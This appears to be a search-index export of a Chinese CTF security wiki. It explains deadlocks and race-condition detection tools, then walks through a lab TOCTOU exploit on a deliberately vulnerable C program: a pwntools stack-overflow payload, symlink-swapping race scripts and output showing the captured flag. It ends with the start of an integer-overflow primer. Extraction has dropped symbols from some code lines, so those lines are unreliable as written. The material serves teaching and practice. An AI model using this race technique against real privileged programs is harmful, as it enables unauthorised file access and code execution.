            "text": "\u5f53\u540c\u6b65\u539f\u8bed\u4f7f\u7528\u7684\u4e0d\u6070\u5f53\u7684\u65f6\u5019\uff0c\u8fdb\u7a0b\u5c31\u53ef\u80fd\u4f1a\u51fa\u73b0\u6b7b\u9501\u3002\u5f53\u4e24\u4e2a\u6216\u4e24\u4e2a\u4ee5\u4e0a\u7684\u6267\u884c\u6d41\u4e92\u76f8\u963b\u585e\u5bfc\u81f4\u90fd\u4e0d\u80fd\u7ee7\u7eed\u6267\u884c\uff0c\u6b7b\u9501\u5c31\u4f1a\u53d1\u751f\u3002\u5176\u5b9e\uff0c\u6b7b\u9501\u4e3b\u8981\u662f\u56e0\u4e3a\u5728\u51b2\u7a81\u7684\u6267\u884c\u6d41\u4e2d\uff0c\u51fa\u73b0\u4e86\u5faa\u73af\u7b49\u5f85\u7684\u6267\u884c\u6d41\uff0c\u5373\u5faa\u73af\u7b49\u5f85\u4e2d\u7684\u6bcf\u4e00\u4e2a\u6267\u884c\u6d41\u90fd\u83b7\u5f97\u4e00\u4e2a\u8d44\u6e90\uff0c\u540c\u65f6\u8bd5\u56fe\u83b7\u5f97\u4e0b\u4e00\u4e2a\u8d44\u6e90\u3002\u4e0b\u56fe\u6240\u793a\uff0cP1\u3001P2 \u4e24\u4e2a\u8fdb\u7a0b\u90fd\u9700\u8981\u8d44\u6e90\u624d\u80fd\u7ee7\u7eed\u8fd0\u884c\u3002P1 \u62e5\u6709\u8d44\u6e90 R2\u3001\u8fd8\u9700\u8981\u989d\u5916\u8d44\u6e90 R1 \u624d\u80fd\u8fd0\u884c\uff1bP2 \u62e5\u6709\u8d44\u6e90 R1\u3001\u8fd8\u9700\u8981\u989d\u5916\u8d44\u6e90 R2 \u624d\u80fd\u8fd0\u884c\uff0c\u4e24\u8fb9\u90fd\u5728\u4e92\u76f8\u7b49\u5f85\u800c\u6ca1\u6709\u4efb\u4f55\u4e00\u4e2a\u53ef\u8fd0\u884c\u3002   \u4e00\u822c\u6765\u8bf4\uff0c\u6b7b\u9501\u6709\u4ee5\u4e0b\u56db\u4e2a\u5fc5\u8981\u6761\u4ef6   \u4e92\u65a5\uff0c\u8d44\u6e90\u662f\u4e92\u65a5\u7684\u3002  \u6301\u6709\u548c\u7b49\u5f85\uff0c\u6301\u6709\u5df2\u6709\u7684\u8d44\u6e90\uff0c\u540c\u65f6\u7b49\u5f85\u4f7f\u7528\u4e0b\u4e00\u4e2a\u8d44\u6e90\u3002  \u4e0d\u53ef\u62a2\u5360\uff0c\u8fdb\u7a0b\u6240\u83b7\u5f97\u7684\u8d44\u6e90\u5728\u672a\u4f7f\u7528\u5b8c\u6bd5\u4e4b\u524d\uff0c\u8d44\u6e90\u7533\u8bf7\u8005\u4e0d\u80fd\u5f3a\u884c\u5730\u4ece\u8d44\u6e90\u5360\u6709\u8005\u624b\u4e2d\u593a\u53d6\u8d44\u6e90\uff0c\u800c\u53ea\u80fd\u7531\u8be5\u8d44\u6e90\u7684\u5360\u6709\u8005\u8fdb\u7a0b\u81ea\u884c\u91ca\u653e\u3002  \u5faa\u73af\u7b49\u5f85\uff0c\u5faa\u73af\u7b49\u5f85\u8d44\u6e90\u3002   \u800c\u5982\u679c\u60f3\u8981\u6d88\u9664\u6b7b\u9501\uff0c\u4e5f\u5c31\u662f\u6253\u7834\u4e0a\u9762\u7684\u56db\u4e2a\u5fc5\u8981\u6761\u4ef6\u3002  \u6b64\u5916\uff0c\u6b7b\u9501\u53ef\u80fd\u6765\u6e90\u4e8e\u4ee5\u4e0b\u7684\u539f\u56e0   \u5904\u7406\u5668\u901f\u5ea6  \u8fdb\u7a0b\u6216\u8005\u7ebf\u7a0b\u8c03\u5ea6\u7b97\u6cd5\u7684\u53d8\u52a8  \u5728\u6267\u884c\u7684\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u540c\u5185\u5b58\u7684\u9650\u5236\u3002  \u4efb\u4f55\u80fd\u591f\u4e2d\u65ad\u7a0b\u5e8f\u6267\u884c\u7684\u5f02\u6b65\u4e8b\u4ef6\u3002", 
            "title": "\u6982\u8ff0"
        }, 
        {
            "location": "/pwn/race-condition/introduction/#_10", 
            "text": "\u6b7b\u9501\u4e00\u822c\u60c5\u51b5\u4e0b\u4f1a\u9020\u6210\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u3002", 
            "title": "\u5f71\u54cd"
        }, 
        {
            "location": "/pwn/race-condition/introduction/#_11", 
            "text": "\u90a3\u4e48\uff0c\u8bf4\u5230\u8fd9\u91cc\uff0c\u6211\u4eec\u6709\u6ca1\u6709\u53ef\u80fd\u6765\u68c0\u6d4b\u6761\u4ef6\u7ade\u4e89\u6f0f\u6d1e\u5462\uff1f\u76ee\u524d\u4e5f\u786e\u5b9e\u6709\u8fd9\u65b9\u9762\u7684\u7814\u7a76\uff0c\u4e5f\u662f\u4e3b\u8981\u4ece\u9759\u6001\u5206\u6790\u548c\u52a8\u6001\u5206\u6790\u4e24\u4e2a\u65b9\u9762\u6765\u68c0\u6d4b\u3002", 
            "title": "\u68c0\u6d4b"
        }, 
        {
            "location": "/pwn/race-condition/introduction/#_12", 
            "text": "\u76ee\u524d\u5df2\u77e5\u7684\u9759\u6001\u68c0\u6d4b\u5de5\u5177\u6709   Flawfinder  \u76ee\u6807\uff1aC/C++\u6e90\u7801  \u6b65\u9aa4  \u5efa\u7acb\u6f0f\u6d1e\u6570\u636e\u5e93  \u8fdb\u884c\u7b80\u5355\u7684\u6587\u672c\u6a21\u5f0f\u5339\u914d\uff0c\u6ca1\u6709\u4efb\u4f55\u7684\u6570\u636e\u6d41\u6216\u63a7\u5236\u6d41\u5206\u6790      ThreadSanitizer  \u76ee\u6807\uff1aC++\u548cGO  \u5b9e\u73b0\uff1aLLVM", 
            "title": "\u9759\u6001\u68c0\u6d4b"
        }, 
        {
            "location": "/pwn/race-condition/introduction/#_13", 
            "text": "Intel Inspector  Valgrind", 
            "title": "\u52a8\u6001\u68c0\u6d4b"
        }, 
        {
            "location": "/pwn/race-condition/introduction/#_14", 
            "text": "http://www.teraits.com/pitagoras/marcio/segapp/05.ppt  http://repository.root-me.org/Programmation/C%20-%20C++/EN%20-%20Secure%20Coding%20in%20C%20and%20C++%20Race%20Conditions.pdf  https://www.blackhat.com/presentations/bh-europe-04/bh-eu-04-tsyrklevich/bh-eu-04-tsyrklevich.pdf  https://xinhuang.github.io/posts/2014-09-23-detect-race-condition-using-clang-thread-sanitizer.html  https://llvm.org/devmtg/2011-11/Hutchins_ThreadSafety.pdf  http://www.cnblogs.com/biyeymyhjob/archive/2012/07/20/2601655.html  http://www.cnblogs.com/huxiao-tee/p/4660352.html  https://github.com/dirtycow/dirtycow.github.io", 
            "title": "\u53c2\u8003"
        }, 
        {
            "location": "/pwn/race-condition/problem/", 
            "text": "\u9898\u76ee\n\n\n\u6784\u9020\u4f8b\u5b50\n\n\n\u6e90\u4ee3\u7801\n\n\n\u6e90\u4ee3\u7801\u5982\u4e0b\n\n\n#include\n \nfcntl.h\n\n\n#include\n \nstdio.h\n\n\n#include\n \nstdlib.h\n\n\n#include\n \nstring.h\n\n\n#include\n \nsys/stat.h\n\n\n#include\n \nunistd.h\n\n\nvoid\n \nshowflag\n()\n \n{\n \nsystem\n(\ncat flag\n);\n \n}\n\n\nvoid\n \nvuln\n(\nchar\n \n*\nfile\n,\n \nchar\n \n*\nbuf\n)\n \n{\n\n  \nint\n \nnumber\n;\n\n  \nint\n \nindex\n \n=\n \n0\n;\n\n  \nint\n \nfd\n \n=\n \nopen\n(\nfile\n,\n \nO_RDONLY\n);\n\n  \nif\n \n(\nfd\n \n==\n \n-\n1\n)\n \n{\n\n    \nperror\n(\nopen file failed!!\n);\n\n    \nreturn\n;\n\n  \n}\n\n  \nwhile\n \n(\n1\n)\n \n{\n\n    \nnumber\n \n=\n \nread\n(\nfd\n,\n \nbuf\n \n+\n \nindex\n,\n \n128\n);\n\n    \nif\n \n(\nnumber\n \n=\n \n0\n)\n \n{\n\n      \nbreak\n;\n\n    \n}\n\n    \nindex\n \n+=\n \nnumber\n;\n\n  \n}\n\n  \nbuf\n[\nindex\n \n+\n \n1\n]\n \n=\n \n\\x00\n;\n\n\n}\n\n\nvoid\n \ncheck\n(\nchar\n \n*\nfile\n)\n \n{\n\n  \nstruct\n \nstat\n \ntmp\n;\n\n  \nif\n \n(\nstrcmp\n(\nfile\n,\n \nflag\n)\n \n==\n \n0\n)\n \n{\n\n    \nputs\n(\nfile can not be flag!!\n);\n\n    \nexit\n(\n0\n);\n\n  \n}\n\n  \nstat\n(\nfile\n,\n \ntmp\n);\n\n  \nif\n \n(\ntmp\n.\nst_size\n \n \n255\n)\n \n{\n\n    \nputs\n(\nfile size is too large!!\n);\n\n    \nexit\n(\n0\n);\n\n  \n}\n\n\n}\n\n\nint\n \nmain\n(\nint\n \nargc\n,\n \nchar\n \n*\nargv\n[\nargc\n])\n \n{\n\n  \nchar\n \nbuf\n[\n256\n];\n\n  \nif\n \n(\nargc\n \n==\n \n2\n)\n \n{\n\n    \ncheck\n(\nargv\n[\n1\n]);\n\n    \nvuln\n(\nargv\n[\n1\n],\n \nbuf\n);\n\n  \n}\n \nelse\n \n{\n\n    \nputs\n(\nUsage ./prog \nfilename\n);\n\n  \n}\n\n  \nreturn\n \n0\n;\n\n\n}\n\n\n\n\n\n\u5206\u6790\n\n\n\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u7684\u57fa\u672c\u6d41\u7a0b\u5982\u4e0b\n\n\n\n\n\u68c0\u67e5\u4f20\u5165\u7684\u547d\u4ee4\u884c\u53c2\u6570\u662f\u4e0d\u662f \u201cflag\u201d\uff0c\u5982\u679c\u662f\u7684\u8bdd\uff0c\u5c31\u9000\u51fa\u3002\n\n\n\u68c0\u67e5\u4f20\u5165\u7684\u547d\u4ee4\u884c\u53c2\u6570\u5bf9\u5e94\u7684\u6587\u4ef6\u5927\u5c0f\u662f\u5426\u5927\u4e8e 255\uff0c\u662f\u7684\u8bdd\uff0c\u5c31\u76f4\u63a5\u9000\u51fa\u3002\n\n\n\u5c06\u547d\u4ee4\u884c\u53c2\u6570\u6240\u5bf9\u5e94\u7684\u6587\u4ef6\u5185\u5bb9\u8bfb\u5165\u5230 buf \u4e2d \uff0cbuf \u7684\u5927\u5c0f\u4e3a 256\u3002\n\n\n\n\n\u770b\u4f3c\u6211\u4eec\u68c0\u67e5\u4e86\u6587\u4ef6\u7684\u5927\u5c0f\uff0c\u540c\u65f6 buf \u7684\u5927\u5c0f\u4e5f\u53ef\u4ee5\u6ee1\u8db3\u5bf9\u5e94\u7684\u6700\u5927\u5927\u5c0f\uff0c\u4f46\u662f\u8fd9\u91cc\u5b58\u5728\u4e00\u4e2a\u6761\u4ef6\u7ade\u4e89\u7684\u95ee\u9898\u3002\n\n\n\u5982\u679c\u6211\u4eec\u5728\u7a0b\u5e8f\u68c0\u67e5\u5b8c\u5bf9\u5e94\u7684\u6587\u4ef6\u5927\u5c0f\u540e\uff0c\u5c06\u5bf9\u5e94\u7684\u6587\u4ef6\u5220\u9664\uff0c\u5e76\u7b26\u53f7\u94fe\u63a5\u5230\u53e6\u5916\u4e00\u4e2a\u66f4\u5927\u7684\u6587\u4ef6\uff0c\u90a3\u4e48\u7a0b\u5e8f\u6240\u8bfb\u5165\u7684\u5185\u5bb9\u5c31\u4f1a\u66f4\u591a\uff0c\u4ece\u800c\u5c31\u4f1a\u4ea7\u751f\u6808\u6ea2\u51fa\u3002\n\n\n\u57fa\u672c\u601d\u8def\n\n\n\u90a3\u4e48\uff0c\u57fa\u672c\u601d\u8def\u6765\u4e86\uff0c\u6211\u4eec\u662f\u60f3\u8981\u83b7\u5f97\u5bf9\u5e94\u7684\nflag\n\u7684\u5185\u5bb9\u3002\u90a3\u4e48\u6211\u4eec\u53ea\u8981\u901a\u8fc7\u6808\u6ea2\u51fa\u4fee\u6539\u5bf9\u5e94\u7684\nmain\n\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u5373\u53ef\uff0c\u901a\u8fc7\u53cd\u6c47\u7f16\u4ee5\u53ca\u8c03\u8bd5\u53ef\u4ee5\u83b7\u5f97\nshowflag\n\u7684\u5730\u5740\uff0c\u83b7\u5f97\u5bf9\u5e94\u7684payload\n\n\n\u279c\n  \nracetest\n \ncat\n \npayload\n.\npy\n \n\nfrom\n \npwn\n \nimport\n \n*\n\n\ntest\n \n=\n \nELF\n(\n./test\n)\n\n\npayload\n \n=\n \na\n \n*\n \n0x100\n \n+\n \nb\n \n*\n \n8\n \n+\n \np64\n(\ntest\n.\nsymbols\n[\nshowflag\n])\n\n\nopen\n(\nbig\n,\n \nw\n)\n.\nwrite\n(\npayload\n)\n\n\n\n\n\n\u5bf9\u5e94\u4e24\u4e2a\u6761\u4ef6\u7ade\u4e89\u7684\u811a\u672c\u4e3a\n\n\n\u279c  racetest cat exp.sh    \n\n#!/bin/sh\n\n\nfor\n i in \n`\nseq \n500\n`\n\n\ndo\n\n    cp small fake\n    sleep \n0\n.000008\n    rm fake\n    ln -s big fake\n    rm fake\n\ndone\n\n\u279c  racetest cat run.sh \n\n#!/bin/sh\n\n\nfor\n i in \n`\nseq \n1000\n`\n\n\ndo\n\n    ./test fake\n\ndone\n\n\n\n\n\n\u5176\u4e2d exp \u7528\u4e8e\u6765\u7ade\u4e89\u5728\u76f8\u5e94\u7684\u7a97\u53e3\u5185\u5220\u9664 fake \u6587\u4ef6\uff0c\u540c\u65f6\u6267\u884c\u7b26\u53f7\u94fe\u63a5\u3002run \u7528\u6765\u6267\u884c\u7a0b\u5e8f\u3002\n\n\n\u5177\u4f53\u6548\u679c\n\n\n\u279c  racetest \n(\nsh exp.sh \n)\n \n sh run.sh\n\n[\n...\n]\n\nfile size is too large!!\nopen file failed!!: No such file or directory\nopen file failed!!: No such file or directory\nopen file failed!!: No such file or directory\nopen file failed!!: No such file or directory\nfile size is too large!!\nopen file failed!!: No such file or directory\nopen file failed!!: No such file or directory\nflag\n{\nrace_condition_succeed!\n}\n\n\n[\n...\n]\n\n\n\n\n\n\u5176\u4e2d\u6210\u529f\u7684\u5173\u952e\u5728\u4e8e\u5bf9\u5e94\u7684 \nsleep\n \u7684\u65f6\u95f4\u9009\u62e9\u3002\n\n\n\u53c2\u8003\n\n\n\n\nhttp://www.cnblogs.com/biyeymyhjob/archive/2012/07/20/2601655.html\n\n\nhttp://www.cnblogs.com/huxiao-tee/p/4660352.html\n\n\nhttps://github.com/dirtycow/dirtycow.github.io", 
            "title": "\u4f8b\u9898"
        }, 
        {
            "location": "/pwn/race-condition/problem/#_1", 
            "text": "", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/pwn/race-condition/problem/#_2", 
            "text": "", 
            "title": "\u6784\u9020\u4f8b\u5b50"
        }, 
        {
            "location": "/pwn/race-condition/problem/#_3", 
            "text": "\u6e90\u4ee3\u7801\u5982\u4e0b  #include   fcntl.h  #include   stdio.h  #include   stdlib.h  #include   string.h  #include   sys/stat.h  #include   unistd.h  void   showflag ()   {   system ( cat flag );   }  void   vuln ( char   * file ,   char   * buf )   { \n   int   number ; \n   int   index   =   0 ; \n   int   fd   =   open ( file ,   O_RDONLY ); \n   if   ( fd   ==   - 1 )   { \n     perror ( open file failed!! ); \n     return ; \n   } \n   while   ( 1 )   { \n     number   =   read ( fd ,   buf   +   index ,   128 ); \n     if   ( number   =   0 )   { \n       break ; \n     } \n     index   +=   number ; \n   } \n   buf [ index   +   1 ]   =   \\x00 ;  }  void   check ( char   * file )   { \n   struct   stat   tmp ; \n   if   ( strcmp ( file ,   flag )   ==   0 )   { \n     puts ( file can not be flag!! ); \n     exit ( 0 ); \n   } \n   stat ( file ,   tmp ); \n   if   ( tmp . st_size     255 )   { \n     puts ( file size is too large!! ); \n     exit ( 0 ); \n   }  }  int   main ( int   argc ,   char   * argv [ argc ])   { \n   char   buf [ 256 ]; \n   if   ( argc   ==   2 )   { \n     check ( argv [ 1 ]); \n     vuln ( argv [ 1 ],   buf ); \n   }   else   { \n     puts ( Usage ./prog  filename ); \n   } \n   return   0 ;  }", 
            "title": "\u6e90\u4ee3\u7801"
        }, 
        {
            "location": "/pwn/race-condition/problem/#_4", 
            "text": "\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u7684\u57fa\u672c\u6d41\u7a0b\u5982\u4e0b   \u68c0\u67e5\u4f20\u5165\u7684\u547d\u4ee4\u884c\u53c2\u6570\u662f\u4e0d\u662f \u201cflag\u201d\uff0c\u5982\u679c\u662f\u7684\u8bdd\uff0c\u5c31\u9000\u51fa\u3002  \u68c0\u67e5\u4f20\u5165\u7684\u547d\u4ee4\u884c\u53c2\u6570\u5bf9\u5e94\u7684\u6587\u4ef6\u5927\u5c0f\u662f\u5426\u5927\u4e8e 255\uff0c\u662f\u7684\u8bdd\uff0c\u5c31\u76f4\u63a5\u9000\u51fa\u3002  \u5c06\u547d\u4ee4\u884c\u53c2\u6570\u6240\u5bf9\u5e94\u7684\u6587\u4ef6\u5185\u5bb9\u8bfb\u5165\u5230 buf \u4e2d \uff0cbuf \u7684\u5927\u5c0f\u4e3a 256\u3002   \u770b\u4f3c\u6211\u4eec\u68c0\u67e5\u4e86\u6587\u4ef6\u7684\u5927\u5c0f\uff0c\u540c\u65f6 buf \u7684\u5927\u5c0f\u4e5f\u53ef\u4ee5\u6ee1\u8db3\u5bf9\u5e94\u7684\u6700\u5927\u5927\u5c0f\uff0c\u4f46\u662f\u8fd9\u91cc\u5b58\u5728\u4e00\u4e2a\u6761\u4ef6\u7ade\u4e89\u7684\u95ee\u9898\u3002  \u5982\u679c\u6211\u4eec\u5728\u7a0b\u5e8f\u68c0\u67e5\u5b8c\u5bf9\u5e94\u7684\u6587\u4ef6\u5927\u5c0f\u540e\uff0c\u5c06\u5bf9\u5e94\u7684\u6587\u4ef6\u5220\u9664\uff0c\u5e76\u7b26\u53f7\u94fe\u63a5\u5230\u53e6\u5916\u4e00\u4e2a\u66f4\u5927\u7684\u6587\u4ef6\uff0c\u90a3\u4e48\u7a0b\u5e8f\u6240\u8bfb\u5165\u7684\u5185\u5bb9\u5c31\u4f1a\u66f4\u591a\uff0c\u4ece\u800c\u5c31\u4f1a\u4ea7\u751f\u6808\u6ea2\u51fa\u3002", 
            "title": "\u5206\u6790"
        }, 
        {
            "location": "/pwn/race-condition/problem/#_5", 
            "text": "\u90a3\u4e48\uff0c\u57fa\u672c\u601d\u8def\u6765\u4e86\uff0c\u6211\u4eec\u662f\u60f3\u8981\u83b7\u5f97\u5bf9\u5e94\u7684 flag \u7684\u5185\u5bb9\u3002\u90a3\u4e48\u6211\u4eec\u53ea\u8981\u901a\u8fc7\u6808\u6ea2\u51fa\u4fee\u6539\u5bf9\u5e94\u7684 main \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u5373\u53ef\uff0c\u901a\u8fc7\u53cd\u6c47\u7f16\u4ee5\u53ca\u8c03\u8bd5\u53ef\u4ee5\u83b7\u5f97 showflag \u7684\u5730\u5740\uff0c\u83b7\u5f97\u5bf9\u5e94\u7684payload  \u279c    racetest   cat   payload . py   from   pwn   import   *  test   =   ELF ( ./test )  payload   =   a   *   0x100   +   b   *   8   +   p64 ( test . symbols [ showflag ])  open ( big ,   w ) . write ( payload )   \u5bf9\u5e94\u4e24\u4e2a\u6761\u4ef6\u7ade\u4e89\u7684\u811a\u672c\u4e3a  \u279c  racetest cat exp.sh     #!/bin/sh  for  i in  ` seq  500 `  do \n    cp small fake\n    sleep  0 .000008\n    rm fake\n    ln -s big fake\n    rm fake done \n\u279c  racetest cat run.sh  #!/bin/sh  for  i in  ` seq  1000 `  do \n    ./test fake done   \u5176\u4e2d exp \u7528\u4e8e\u6765\u7ade\u4e89\u5728\u76f8\u5e94\u7684\u7a97\u53e3\u5185\u5220\u9664 fake \u6587\u4ef6\uff0c\u540c\u65f6\u6267\u884c\u7b26\u53f7\u94fe\u63a5\u3002run \u7528\u6765\u6267\u884c\u7a0b\u5e8f\u3002", 
            "title": "\u57fa\u672c\u601d\u8def"
        }, 
        {
            "location": "/pwn/race-condition/problem/#_6", 
            "text": "\u279c  racetest  ( sh exp.sh  )    sh run.sh [ ... ] \nfile size is too large!!\nopen file failed!!: No such file or directory\nopen file failed!!: No such file or directory\nopen file failed!!: No such file or directory\nopen file failed!!: No such file or directory\nfile size is too large!!\nopen file failed!!: No such file or directory\nopen file failed!!: No such file or directory\nflag { race_condition_succeed! }  [ ... ]   \u5176\u4e2d\u6210\u529f\u7684\u5173\u952e\u5728\u4e8e\u5bf9\u5e94\u7684  sleep  \u7684\u65f6\u95f4\u9009\u62e9\u3002", 
            "title": "\u5177\u4f53\u6548\u679c"
        }, 
        {
            "location": "/pwn/race-condition/problem/#_7", 
            "text": "http://www.cnblogs.com/biyeymyhjob/archive/2012/07/20/2601655.html  http://www.cnblogs.com/huxiao-tee/p/4660352.html  https://github.com/dirtycow/dirtycow.github.io", 
            "title": "\u53c2\u8003"
        }, 
        {
            "location": "/pwn/integeroverflow/intof/", 
            "text": "\u6574\u6570\u6ea2\u51fa\n\n\n\u4ecb\u7ecd\n\n\n\u5728C\u8bed\u8a00\u4e2d\uff0c\u6574\u6570\u7684\u57fa\u672c\u6570\u636e\u7c7b\u578b\u5206\u4e3a\u77ed\u6574\u578b(short)\uff0c\u6574\u578b(int)\uff0c\u957f\u6574\u578b(long)\uff0c\u8fd9\u4e09\u4e2a\u6570\u636e\u7c7b\u578b\u8fd8\u5206\u4e3a\u6709\u7b26\u53f7\u548c\u65e0\u7b26\u53f7\uff0c\u6bcf\u79cd\u6570\u636e\u7c7b\u578b\u90fd\u6709\u5404\u81ea\u7684\u5927\u5c0f\u8303\u56f4\uff0c(\u56e0\u4e3a\u6570\u636e\u7c7b\u578b\u7684\u5927\u5c0f\u8303\u56f4\u662f\u7f16\u8bd1\u5668\u51b3\u5b9a\u7684\uff0c\u6240\u4ee5\u4e4b\u540e\u6240\u8ff0\u90fd\u9ed8\u8ba4\u662f 64 \u4f4d\u4e0b\u4f7f\u7528 gcc-5.4)\uff0c\u5982\u4e0b\u6240\u793a:\n\n\n\n\n\n\n\n\n\u7c7b\u578b\n\n\n\u5b57\u8282\n\n\n\u8303\u56f4\n\n\n\n\n\n\n\n\n\n\nshort int\n\n\n2byte(word)\n\n\n0~32767(0~0x7fff) \n -32768~-1(0x8000~0xffff)\n\n\n\n\n\n\nunsigned short int\n\n\n2byte(word)\n\n\n0~65535(0~0xffff)\n\n\n\n\n\n\nint\n\n\n4byte(dword)\n\n\n0~2147483647(0~0x7fffffff) \n -2147483648~-1(0x80000000~0xffffffff)\n\n\n\n\n\n\nunsigned int\n\n\n4byte(dword)\n\n\n0~4294967295(0~0xffffffff)\n\n\n\n\n\n\nlong int\n\n\n8byte(qword)\n\n\n\u6b63: 0~0x7fffffffffffffff \n \u8d1f:0x8000000000000000~0xffffffffffffffff\n\n\n\n\n\n\nunsigned long int\n\n\n8byte(qword)\n\n\n0~0xffffffffffffffff\n\n\n\n\n\n\n\n\n\u5f53\u7a0b\u5e8f\u4e2d\u7684\u6570\u636e\u8d85\u8fc7\u5176\u6570\u636e\u7c7b\u578b\u7684\u8303\u56f4\uff0c\u5219\u4f1a\u9020\u6210\u6ea2\u51fa\uff0c\u6574\u6570\u7c7b\u578b\u7684\u6ea2\u51fa\u88ab\u79f0\u4e3a\u6574\u6570\u6ea2\u51fa\u3002\n\n\n\u539f\u7406\n\n\n\u63a5\u4e0b\u6765\u7b80\u5355\u9610\u8ff0\u4e0b\u6574\u6570\u6ea2\u51fa\u7684\u539f\u7406\n\n\n\u4e0a\u754c\u6ea2\u51fa\n\n\n# \u4f2a\u4ee3\u7801\nshort int a;\n\na = a + 1;\n# \u5bf9\u5e94\u7684\u6c47\u7f16\nmovzx  eax, word ptr [rbp - 0x1c]\nadd    eax, 1\nmov    word ptr [rbp - 0x1c], ax\n\nunsigned short int b;\n\nb = b + 1;\n# assembly code\nadd    word ptr [rbp - 0x1a], 1\n\n\n\n\n\u4e0a\u754c\u6ea2\u51fa\u6709\u4e24\u79cd\u60c5\u51b5\uff0c\u4e00\u79cd\u662f \n0x7fff + 1\n\uff0c \u53e6\u4e00\u79cd\u662f \n0xffff + 1\n\u3002\n\n\n\u56e0\u4e3a\u8ba1\u7b97\u673a\u5e95\u5c42\u6307\u4ee4\u662f\u4e0d\u533a\u5206\u6709\u7b26\u53f7\u548c\u65e0\u7b26\u53f7\u7684\uff0c\u6570\u636e\u90fd\u662f\u4ee5\u4e8c\u8fdb\u5236\u5f62\u5f0f\u5b58\u5728(\u7f16\u8bd1\u5668\u7684\u5c42\u9762\u624d\u5bf9\u6709\u7b26\u53f7\u548c\u65e0\u7b26\u53f7\u8fdb\u884c\u533a\u5206\uff0c\u4ea7\u751f\u4e0d\u540c\u7684\u6c47\u7f16\u6307\u4ee4)\u3002\n\n\n\u6240\u4ee5 \nadd 0x7fff, 1 == 0x8000\n\uff0c\u8fd9\u79cd\u4e0a\u754c\u6ea2\u51fa\u5bf9\u65e0\u7b26\u53f7\u6574\u578b\u5c31\u6ca1\u6709\u5f71\u54cd\uff0c\u4f46\u662f\u5728\u6709\u7b26\u53f7\u77ed\u6574\u578b\u4e2d\uff0c\n0x7fff\n \u8868\u793a\u7684\u662f \n32767\n\uff0c\u4f46\u662f \n0x8000\n \u8868\u793a\u7684\u662f \n-32768\n\uff0c\u7528\u6570\u5b66\u8868\u8fbe\u5f0f\u6765\u8868\u793a\u5c31\u662f\u5728\u6709\u7b26\u53f7\u77ed\u6574\u578b\u4e2d \n32767+1 == -32768\n\u3002\n\n\n\u7b2c\u4e8c\u79cd\u60c5\u51b5\u662f \nadd 0xffff, 1\n\uff0c\u8fd9\u79cd\u60c5\u51b5\u9700\u8981\u8003\u8651\u7684\u662f\u7b2c\u4e00\u4e2a\u64cd\u4f5c\u6570\u3002\n\n\n\u6bd4\u5982\u4e0a\u9762\u7684\u6709\u7b26\u53f7\u578b\u52a0\u6cd5\u7684\u6c47\u7f16\u4ee3\u7801\u662f \nadd eax, 1\n\uff0c\u56e0\u4e3a \neax=0xffff\n\uff0c\u6240\u4ee5 \nadd eax, 1 == 0x10000\n\uff0c\u4f46\u662f\u65e0\u7b26\u53f7\u7684\u6c47\u7f16\u4ee3\u7801\u662f\u5bf9\u5185\u5b58\u8fdb\u884c\u52a0\u6cd5\u8fd0\u7b97 \nadd word ptr [rbp - 0x1a], 1 == 0x0000\n\u3002\n\n\n\u5728\u6709\u7b26\u53f7\u7684\u52a0\u6cd5\u4e2d\uff0c\u867d\u7136 \neax\n \u7684\u7ed3\u679c\u4e3a 0x10000\uff0c\u4f46\u662f\u53ea\u628a \nax=0x0000\n \u7684\u503c\u50a8\u5b58\u5230\u4e86\u5185\u5b58\u4e2d\uff0c\u4ece\u7ed3\u679c\u770b\u548c\u65e0\u7b26\u53f7\u662f\u4e00\u6837\u7684\u3002\n\n\n\u518d\u4ece\u6570\u5b57\u5c42\u9762\u770b\u770b\u8fd9\u79cd\u6ea2\u51fa\u7684\u7ed3\u679c\uff0c\u5728\u6709\u7b26\u53f7\u77ed\u6574\u578b\u4e2d\uff0c\n0xffff==-1\uff0c-1 + 1 == 0\n\uff0c\u4ece\u6709\u7b26\u53f7\u770b\u8fd9\u79cd\u8ba1\u7b97\u6ca1\u95ee\u9898\u3002\n\n\n\u4f46\u662f\u5728\u65e0\u7b26\u53f7\u77ed\u6574\u578b\u4e2d\uff0c\n0xffff == 65535, 65535 + 1 == 0\n\u3002\n\n\n\u4e0b\u754c\u6ea2\u51fa\n\n\n\u4e0b\u5c4a\u6ea2\u51fa\u7684\u9053\u7406\u548c\u4e0a\u754c\u6ea2\u51fa\u4e00\u6837\uff0c\u5728\u6c47\u7f16\u4ee3\u7801\u4e2d\uff0c\u53ea\u662f\u628a \nadd\n \u66ff\u6362\u6210\u4e86 \nsub\n\u3002\n\n\n\u4e00\u6837\u4e5f\u662f\u6709\u4e24\u79cd\u60c5\u51b5\uff1a\n\n\n\u7b2c\u4e00\u79cd\u662f \nsub 0x0000, 1 == 0xffff\n\uff0c\u5bf9\u4e8e\u6709\u7b26\u53f7\u6765\u8bf4 \n0 - 1 == -1\n \u6ca1\u95ee\u9898\uff0c\u4f46\u662f\u5bf9\u4e8e\u65e0\u7b26\u53f7\u6765\u8bf4\u5c31\u6210\u4e86 \n0 - 1 == 65535\n\u3002\n\n\n\u7b2c\u4e8c\u79cd\u662f \nsub 0x8000, 1 == 0x7fff\n\uff0c\u5bf9\u4e8e\u65e0\u7b26\u53f7\u6765\u8bf4\u662f \n32768 - 1 == 32767\n \u662f\u6b63\u786e\u7684\uff0c\u4f46\u662f\u5bf9\u4e8e\u6709\u7b26\u53f7\u6765\u8bf4\u5c31\u53d8\u6210\u4e86 \n-32768 - 1 = 